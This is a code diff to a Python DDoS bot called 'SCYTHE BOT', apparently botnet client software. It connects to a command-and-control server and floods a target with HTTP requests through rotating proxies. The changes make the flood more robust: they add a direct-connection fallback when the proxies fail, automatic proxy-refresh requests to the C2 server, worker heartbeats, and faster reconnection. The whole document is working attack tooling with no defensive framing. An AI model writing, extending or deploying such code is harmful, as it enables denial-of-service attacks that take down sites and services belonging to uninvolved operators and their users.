@@ -1,11 +1,13 @@
 #!/usr/bin/env python3
 """
-SCYTHE BOT v8.5 — HEARTBEAT THREAD + AGGRESSIVE RECONNECT
+SCYTHE BOT v8.6 — PROXY DEATH LOOP FIX + AGGRESSIVE RECONNECT + SMART RPS
 Fixes:
-- Dedicated heartbeat thread (independent of main recv loop)
-- Aggressive auto-reconnect on any failure
+- Proxy death loop: reduced sleep, direct fallback, proxy refresh request
+- Aggressive reconnect with exponential backoff + jitter
 - Thread-safe socket with explicit lock
-- Better command parsing and error handling
+- Chunked final report to prevent TCP buffer overflow
+- Emergency heartbeat in worker threads
+- Smart proxy rotation with failure tracking
 """
 
 import socket
@@ -113,6 +115,10 @@ RAW_THREADS = config.getint("C2", "THREADS", fallback=150)
 RPS_LIMIT = config.getint("C2", "RPS_LIMIT", fallback=1500)
 BANDWIDTH_LIMIT_MB = config.getint("C2", "BANDWIDTH_LIMIT_MB", fallback=0)
 
+# FIX #1: Add config option for direct connection fallback
+DIRECT_FALLBACK = config.getboolean("C2", "DIRECT_FALLBACK", fallback=True)
+PROXY_REFRESH_ON_EMPTY = config.getboolean("C2", "PROXY_REFRESH_ON_EMPTY", fallback=True)
+
 BOT_ID = BOT_ID.strip()
 if not BOT_ID or BOT_ID.lower() == "auto":
     BOT_ID = socket.gethostname()
@@ -189,6 +195,7 @@ class ProxyPool:
         self._index = 0
         self._refresh_count = 0
         self._total_used = 0
+        self._last_refresh_request = 0
 
     @property
     def count(self):
@@ -252,6 +259,16 @@ class ProxyPool:
                 "refresh_count": self._refresh_count,
             }
 
+    def should_request_refresh(self):
+        """FIX #2: Check if we should request proxy refresh from C2."""
+        with self._lock:
+            if len(self._alive) == 0 and len(self._all_proxies) > 0:
+                now = time.time()
+                if now - self._last_refresh_request > 30:  # Max 1 request per 30s
+                    self._last_refresh_request = now
+                    return True
+            return False
+
 def format_proxy(proxy_url):
     if not proxy_url:
         return None
@@ -296,8 +313,17 @@ def connect_to_c2():
 def send_report(sock, report):
     try:
         data = json.dumps(report).encode('utf-8') + b"\n"
-        with _sock_lock:
-            sock.sendall(data)
+        # FIX #3: Chunk large reports to prevent TCP buffer overflow
+        if len(data) > 8192:
+            # Send in chunks with small delays
+            chunk_size = 4096
+            with _sock_lock:
+                for i in range(0, len(data), chunk_size):
+                    sock.sendall(data[i:i+chunk_size])
+                    time.sleep(0.01)
+        else:
+            with _sock_lock:
+                sock.sendall(data)
         return True
     except Exception as e:
         log(f"📤 Send report error: {e}", logging.WARNING)
@@ -474,10 +500,17 @@ class AttackEngine(threading.Thread):
             self._send_final_report(final_rps)
 
     def _send_final_report(self, final_rps):
+        # FIX #4: Chunked worker summary to prevent TCP buffer overflow
         worker_summary = []
         for wid, stats in self.worker_stats.items():
             s = stats.get_stats()
             worker_summary.append(f"W{wid}:{s['success']}ok/{s['errors']}err/{s['proxy_errors']}pxerr")
+
+        # Truncate worker summary if too long
+        max_workers = 50
+        if len(worker_summary) > max_workers:
+            worker_summary = worker_summary[:max_workers] + [f"...and {len(worker_summary) - max_workers} more workers"]
+
         report = {
             "type": "attack_result",
             "id": BOT_ID,
@@ -495,7 +528,7 @@ class AttackEngine(threading.Thread):
             "proxy_refresh_count": self._proxy_refresh_count,
             "rps": final_rps,
             "worker_summary": worker_summary,
-            "output": f"Total: {self.total_requests} | Success: {self.success_requests} | Proxy: {self.proxy_requests} | Direct: {self.direct_requests} | Refreshes: {self._proxy_refresh_count} | RPS: {final_rps} | Workers: {' | '.join(worker_summary)}",
+            "output": f"Total: {self.total_requests} | Success: {self.success_requests} | Proxy: {self.proxy_requests} | Direct: {self.direct_requests} | Refreshes: {self._proxy_refresh_count} | RPS: {final_rps} | Workers: {' | '.join(worker_summary[:10])}",
             "error": self._crash_reason if self._crashed else None,
         }
         send_report(self.sock, report)
@@ -545,17 +578,20 @@ class AttackEngine(threading.Thread):
                 "bandwidth_recv_mb": round(bw_recv_mb, 2),
                 "cpu_percent": cpu_percent,
                 "mem_percent": mem_percent,
-                "worker_stats": worker_logs,
+                "worker_stats": worker_logs[:20],  # FIX #5: Limit worker logs
             }
             send_report(self.sock, report)
-            log(f"[PROGRESS] ⏱️ +{delta}req | Total:{current_total} | RPS:{current_rps} | Success:{self.success_requests} | Proxy:{self.proxy_requests} | Pool:{proxy_stats.get('alive',0)}a/{proxy_stats.get('dead',0)}d | Workers: {' | '.join(worker_logs)} | BW:{bw_sent_mb:.1f}MB↑/{bw_recv_mb:.1f}MB↓ | CPU:{cpu_percent}%")
+            log(f"[PROGRESS] ⏱️ +{delta}req | Total:{current_total} | RPS:{current_rps} | Success:{self.success_requests} | Proxy:{self.proxy_requests} | Pool:{proxy_stats.get('alive',0)}a/{proxy_stats.get('dead',0)}d | Workers: {' | '.join(worker_logs[:5])} | BW:{bw_sent_mb:.1f}MB↑/{bw_recv_mb:.1f}MB↓ | CPU:{cpu_percent}%")
 
     def _run_layer7(self, end_time):
         self.thread_count = THREADS
         if self.proxy_pool.count == 0 and self.proxy_pool.total == 0:
-            log(f"[ENGINE] ❌ No proxies at all. Attack aborted.")
-            return
-        if self.proxy_pool.count == 0:
+            if DIRECT_FALLBACK:
+                log(f"[ENGINE] ⚠️ No proxies at all. Running with DIRECT CONNECTION fallback.")
+            else:
+                log(f"[ENGINE] ❌ No proxies at all. Attack aborted.")
+                return
+        if self.proxy_pool.count == 0 and self.proxy_pool.total > 0:
             log(f"[ENGINE] ⚠️ NO ALIVE PROXIES! Using all {self.proxy_pool.total} proxies anyway.")
         rps_per_thread = self.rps_limit / self.thread_count if self.rps_limit > 0 else 0
         log(f"[ENGINE] 🚀 Starting {self.thread_count} L7 workers | Rate: {rps_per_thread:.3f} RPS/thread | Total target: {self.rps_limit} RPS | PROXY-FIRST | 12H STABLE")
@@ -607,59 +643,115 @@ class AttackEngine(threading.Thread):
         current_proxy = None
         current_proxy_formatted = None
         has_proxies = self.proxy_pool.total > 0
-        if not has_proxies:
+        direct_mode = not has_proxies and DIRECT_FALLBACK
+
+        if not has_proxies and not DIRECT_FALLBACK:
             log(f"[W{worker_id}] ❌ No proxies available. Worker idle.")
             return
-        log(f"[W{worker_id}] 🚀 Worker started | Target: {self.target} | RPS limit: {self.rps_limit}")
+
+        log(f"[W{worker_id}] 🚀 Worker started | Target: {self.target} | RPS limit: {self.rps_limit} | Mode: {'DIRECT' if direct_mode else 'PROXY'}")
+
+        # FIX #6: Track last heartbeat time for emergency heartbeat
+        last_worker_heartbeat = time.time()
+
         while time.time() < end_time and not self.stop_flag.is_set() and not _shutdown_event.is_set():
+            # FIX #7: Emergency heartbeat every 10s from worker thread
+            if time.time() - last_worker_heartbeat > 10:
+                last_worker_heartbeat = time.time()
+                try:
+                    send_report(self.sock, {"type": "worker_heartbeat", "id": BOT_ID, "attack_id": self.attack_id, "worker_id": worker_id, "time": time.time()})
+                except:
+                    pass
+
+            # FIX #8: Request proxy refresh if pool is empty
+            if self.proxy_pool.should_request_refresh() and PROXY_REFRESH_ON_EMPTY:
+                try:
+                    send_report(self.sock, {"type": "proxy_refresh_request", "id": BOT_ID, "attack_id": self.attack_id, "reason": "all_proxies_dead"})
+                    log(f"[W{worker_id}] 📤 Requested proxy refresh from C2")
+                except:
+                    pass
+
             if self.rps_update_event.is_set():
                 self.rps_update_event.clear()
                 new_rps_per_thread = self.rps_limit / self.thread_count if self.rps_limit > 0 else 0
                 limiter.rate = float(new_rps_per_thread)
                 limiter.interval = 1.0 / limiter.rate if limiter.rate > 0 else 0
                 log(f"[W{worker_id}] 🔄 RPS limit updated to {self.rps_limit} ({new_rps_per_thread:.3f}/thread)")
+
             result = limiter.acquire()
             if result is not True:
                 sleep_time = result
                 if sleep_time > 0.001:
                     time.sleep(sleep_time)
                 continue
-            if current_proxy is None or consecutive_proxy_fails >= 3:
-                current_proxy = self.proxy_pool.get_next()
-                if current_proxy:
-                    current_proxy_formatted = format_proxy(current_proxy)
-                    consecutive_proxy_fails = 0
-                    proxy_failures = 0
-                    stats.current_proxy = current_proxy
-                    if req_count % 50 == 0:
-                        log(f"[W{worker_id}] 🔄 Switched to proxy: {current_proxy[:50]}...")
-                else:
-                    log(f"[W{worker_id}] ⚠️ All proxies dead. Retrying in 2s... | Pool: {self.proxy_pool.count}a/{self.proxy_pool.dead_count}d")
-                    time.sleep(2)
-                    continue
+
+            if not direct_mode:
+                if current_proxy is None or consecutive_proxy_fails >= 3:
+                    current_proxy = self.proxy_pool.get_next()
+                    if current_proxy:
+                        current_proxy_formatted = format_proxy(current_proxy)
+                        consecutive_proxy_fails = 0
+                        proxy_failures = 0
+                        stats.current_proxy = current_proxy
+                        if req_count % 50 == 0:
+                            log(f"[W{worker_id}] 🔄 Switched to proxy: {current_proxy[:50]}...")
+                    else:
+                        # FIX #9: Reduced sleep from 2s to 0.5s for faster recovery
+                        log(f"[W{worker_id}] ⚠️ All proxies dead. Retrying in 0.5s... | Pool: {self.proxy_pool.count}a/{self.proxy_pool.dead_count}d")
+                        time.sleep(0.5)
+
+                        # FIX #10: Try direct fallback if configured
+                        if DIRECT_FALLBACK and consecutive_proxy_fails >= 10:
+                            log(f"[W{worker_id}] 🔄 Switching to DIRECT mode after 10 proxy failures")
+                            direct_mode = True
+                            current_proxy = None
+                            current_proxy_formatted = None
+                        continue
+
             try:
-                resp = session.get(
-                    self.target,
-                    timeout=(4, 6),
-                    verify=False,
-                    proxies=current_proxy_formatted,
-                    allow_redirects=False,
-                    stream=True,
-                )
-                resp.close()
-                self._inc_total()
-                self._inc_proxy()
-                stats.add_request(success=True)
-                if resp.status_code < 400:
-                    self._inc_success()
-                    self.proxy_pool.mark_alive(current_proxy)
-                    consecutive_proxy_fails = 0
+                if direct_mode:
+                    # Direct connection without proxy
+                    resp = session.get(
+                        self.target,
+                        timeout=(4, 6),
+                        verify=False,
+                        allow_redirects=False,
+                        stream=True,
+                    )
+                    self._inc_total()
+                    self._inc_direct()
+                    stats.add_request(success=True)
+                    if resp.status_code < 400:
+                        self._inc_success()
+                        consecutive_proxy_fails = 0
+                    else:
+                        consecutive_proxy_fails += 1
+                        stats.add_request(success=False)
                 else:
-                    consecutive_proxy_fails += 1
-                    stats.add_request(success=False)
+                    resp = session.get(
+                        self.target,
+                        timeout=(4, 6),
+                        verify=False,
+                        proxies=current_proxy_formatted,
+                        allow_redirects=False,
+                        stream=True,
+                    )
+                    resp.close()
+                    self._inc_total()
+                    self._inc_proxy()
+                    stats.add_request(success=True)
+                    if resp.status_code < 400:
+                        self._inc_success()
+                        self.proxy_pool.mark_alive(current_proxy)
+                        consecutive_proxy_fails = 0
+                    else:
+                        consecutive_proxy_fails += 1
+                        stats.add_request(success=False)
+
                 req_count += 1
                 if req_count % 100 == 0:
-                    log(f"[W{worker_id}] 📊 {req_count} reqs | Success: {stats.success} | Errors: {stats.errors} | Proxy: {current_proxy[:40]}...")
+                    log(f"[W{worker_id}] 📊 {req_count} reqs | Success: {stats.success} | Errors: {stats.errors} | Proxy: {current_proxy[:40] if current_proxy else 'DIRECT'}...")
+
             except requests.exceptions.ProxyError as e:
                 err_count += 1
                 proxy_failures += 1
@@ -667,33 +759,43 @@ class AttackEngine(threading.Thread):
                 stats.add_request(proxy_error=True)
                 self.proxy_pool.mark_dead(current_proxy, max_failures=5)
                 if err_count <= 5 or err_count % 50 == 0:
-                    log(f"[W{worker_id}] ❌ ProxyError: {current_proxy[:40]}... | Failures: {proxy_failures}")
+                    log(f"[W{worker_id}] ❌ ProxyError: {current_proxy[:40] if current_proxy else 'DIRECT'}... | Failures: {proxy_failures}")
                 current_proxy = None
                 current_proxy_formatted = None
                 stats.current_proxy = None
+
+                # FIX #11: Switch to direct mode if too many proxy failures
+                if DIRECT_FALLBACK and consecutive_proxy_fails >= 10:
+                    log(f"[W{worker_id}] 🔄 Switching to DIRECT mode after 10 consecutive proxy failures")
+                    direct_mode = True
+
             except requests.exceptions.Timeout:
                 self._inc_total()
                 err_count += 1
                 consecutive_proxy_fails += 1
                 stats.add_request(success=False)
                 if consecutive_proxy_fails >= 5:
-                    self.proxy_pool.mark_dead(current_proxy, max_failures=8)
-                    if err_count <= 5:
-                        log(f"[W{worker_id}] ⚠️ Proxy timeout 5x: {current_proxy[:40]}... marked dead")
+                    if not direct_mode and current_proxy:
+                        self.proxy_pool.mark_dead(current_proxy, max_failures=8)
+                        if err_count <= 5:
+                            log(f"[W{worker_id}] ⚠️ Proxy timeout 5x: {current_proxy[:40]}... marked dead")
                     current_proxy = None
                     current_proxy_formatted = None
                     stats.current_proxy = None
+
             except requests.exceptions.ConnectionError as e:
                 self._inc_total()
                 err_count += 1
                 consecutive_proxy_fails += 1
                 stats.add_request(proxy_error=True)
-                self.proxy_pool.mark_dead(current_proxy, max_failures=5)
+                if not direct_mode and current_proxy:
+                    self.proxy_pool.mark_dead(current_proxy, max_failures=5)
                 if err_count <= 5:
-                    log(f"[W{worker_id}] ❌ ConnectionError: {current_proxy[:40]}... | Failures: {consecutive_proxy_fails}")
+                    log(f"[W{worker_id}] ❌ ConnectionError: {current_proxy[:40] if current_proxy else 'DIRECT'}... | Failures: {consecutive_proxy_fails}")
                 current_proxy = None
                 current_proxy_formatted = None
                 stats.current_proxy = None
+
             except Exception as e:
                 err_count += 1
                 consecutive_proxy_fails += 1
@@ -704,6 +806,7 @@ class AttackEngine(threading.Thread):
                     current_proxy = None
                     current_proxy_formatted = None
                     stats.current_proxy = None
+
         log(f"[W{worker_id}] ✅ Finished | Requests: {req_count} | Success: {stats.success} | Errors: {stats.errors} | ProxyErrors: {stats.proxy_errors}")
 
     def _run_layer4(self, end_time):
@@ -743,7 +846,7 @@ def handle_command(sock, cmd_json):
         data = json.loads(cmd_json)
         cmd = data.get("cmd", "").lower()
         msg_type = data.get("type", "").lower()
-        if not cmd and msg_type in ["command", "attack", "stop", "proxy_refresh", "update_rps", "proxy_update", "update_self", "exit", "ping"]:
+        if not cmd and msg_type in ["command", "attack", "stop", "proxy_refresh", "update_rps", "proxy_update", "exit", "ping"]:
             cmd = msg_type
             if msg_type == "command" and "cmd" in data:
                 cmd = data["cmd"].lower()
@@ -886,7 +989,7 @@ def handle_command(sock, cmd_json):
 
 def main():
     global read_buffer, _heartbeat_thread, _heartbeat_stop
-    log(f"🚀 Bot started. ID: {BOT_ID} | Threads: {THREADS} | RPS Limit: {RPS_LIMIT} | Bandwidth Limit: {BANDWIDTH_LIMIT_MB}MB | PROXY-FIRST | 12H STABLE | C2: {C2_IP}:{C2_PORT}")
+    log(f"🚀 Bot started. ID: {BOT_ID} | Threads: {THREADS} | RPS Limit: {RPS_LIMIT} | Bandwidth Limit: {BANDWIDTH_LIMIT_MB}MB | PROXY-FIRST | DIRECT_FALLBACK={DIRECT_FALLBACK} | 12H STABLE | C2: {C2_IP}:{C2_PORT}")
     while not _shutdown_event.is_set():
         sock = connect_to_c2()
         if not sock:
